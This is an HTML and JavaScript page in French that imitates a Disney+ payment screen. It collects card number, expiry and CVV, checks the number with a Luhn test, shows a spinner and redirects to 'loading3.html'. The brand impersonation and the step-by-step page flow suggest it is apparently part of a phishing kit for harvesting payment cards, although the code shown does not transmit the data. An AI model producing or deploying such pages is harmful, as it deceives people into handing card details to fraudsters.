<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Paiement | Disney+</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('Images/compose.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      min-height: 100vh;
      color: white;
      display: flex;
      flex-direction: column;
    }

    header {
      padding: 20px 40px;
    }

    .logo {
      width: 140px;
    }

    .form-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    form {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 35px;
      border-radius: 12px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
      backdrop-filter: blur(8px);
    }

    h1 {
      text-align: center;
      font-size: 2.2rem;
      margin-bottom: 10px;
      text-shadow: 0 0 6px rgba(0,0,0,0.5);
    }

    .subscription-summary {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 15px;
      border-radius: 8px;
      font-size: 0.95rem;
      text-align: center;
    }

    .input-group {
      display: flex;
      gap: 10px;
    }

    input {
      padding: 12px;
      border-radius: 5px;
      border: none;
      font-size: 1rem;
      width: 100%;
      box-sizing: border-box;
      background: #fff;
      color: #000;
    }

    input::placeholder {
      color: #888;
    }

    button {
      background-color: #0063e5;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 5px;
      font-size: 1rem;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #0483ee;
    }

    .loader {
      display: none;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 10px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .card-icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      align-items: center;
      margin-top: -5px;
    }

    .card-icons img {
      width: 55px;
      height: auto;
      opacity: 0.5;
      filter: grayscale(100%);
      transition: all 0.3s ease;
    }

    .card-icons img.active {
      opacity: 1;
      filter: none;
      transform: scale(1.15);
    }

    @media screen and (max-width: 480px) {
      .input-group {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <header>
    <img src="Images/logo-disney.png" class="logo" alt="Disney+" />
  </header>

  <main class="form-container">
    <h1>Informations bancaires</h1>

    <div class="subscription-summary">
      <p><strong>Abonnement :</strong> Disney+ Standard</p>
      <p><strong>Prix :</strong> 8,99 € / mois</p>
    </div>

    <form id="paymentForm">
      <input id="cardNumber" type="text" placeholder="Numéro de carte" maxlength="19" required />

      <div class="input-group">
        <input type="text" placeholder="MM/AA" maxlength="5" required />
        <input type="text" placeholder="CVV" maxlength="4" required />
      </div>

      <div class="card-icons">
        <img src="Images/visa.png" id="visaIcon" alt="Visa">
        <img src="Images/mastercard.png" id="masterIcon" alt="Mastercard">
        <img src="Images/amex.png" id="amexIcon" alt="Amex">
      </div>

      <div class="loader" id="loader"></div>
      <button type="submit">Payer</button>
    </form>
  </main>

  <script>
    function isValidCardNumber(number) {
      number = number.replace(/\s+/g, '');
      let sum = 0, shouldDouble = false;
      for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    function detectCardType(number) {
      number = number.replace(/\s+/g, '');
      if (/^4/.test(number)) return 'visa';
      if (/^5[1-5]/.test(number)) return 'mastercard';
      if (/^3[47]/.test(number)) return 'amex';
      return '';
    }

    const cardInput = document.getElementById('cardNumber');
    const icons = {
      visa: document.getElementById('visaIcon'),
      mastercard: document.getElementById('masterIcon'),
      amex: document.getElementById('amexIcon')
    };

    cardInput.addEventListener('input', () => {
      let value = cardInput.value.replace(/\D/g, '').slice(0, 16);
      cardInput.value = value.replace(/(.{4})/g, '$1 ').trim();

      const type = detectCardType(value);
      for (let key in icons) {
        icons[key].classList.remove('active');
      }
      if (type && icons[type]) {
        icons[type].classList.add('active');
      }
    });

    document.getElementById('paymentForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const cardNumber = document.getElementById('cardNumber').value;
      const loader = document.getElementById('loader');

      if (!isValidCardNumber(cardNumber)) {
        alert("Numéro de carte invalide !");
        return;
      }

      loader.style.display = 'block';
      setTimeout(() => {
        window.location.href = "loading3.html";
      }, 2000);
    });
  </script>
</body>
</html>
